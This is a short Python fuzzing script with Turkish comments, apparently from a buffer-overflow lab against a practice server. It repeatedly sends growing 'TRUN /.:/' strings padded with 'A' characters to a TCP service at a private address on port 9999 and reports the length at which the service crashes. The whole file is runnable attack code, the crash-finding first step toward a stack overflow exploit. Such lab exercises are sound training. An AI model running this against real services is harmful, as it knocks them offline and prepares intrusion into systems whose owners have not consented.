import socket
from time import sleep
import sys

numberOfCharacters = 100
#karşı server'a sting yollayacağız
stringToSend="TRUN /.:/" + "A" * numberOfCharacters #sistemin algılaması için generic_tcp_send /.:/ ekliyor

while True:
    try:
        mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mySocket.connect(("10.0.2.15",9999))
        bytes = stringToSend.encode(encoding="UTF-8")
        mySocket.send(bytes)
        mySocket.close()

        stringToSend = stringToSend + "A" * numberOfCharacters

        sleep(1)
    except KeyboardInterrupt:
        print("Crashed at: " + str(len(stringToSend)))
        sys.exit()
    except Exception as e:
        print("Crashed at: "+ str(len(stringToSend)))
        print(e)
        sys.exit()
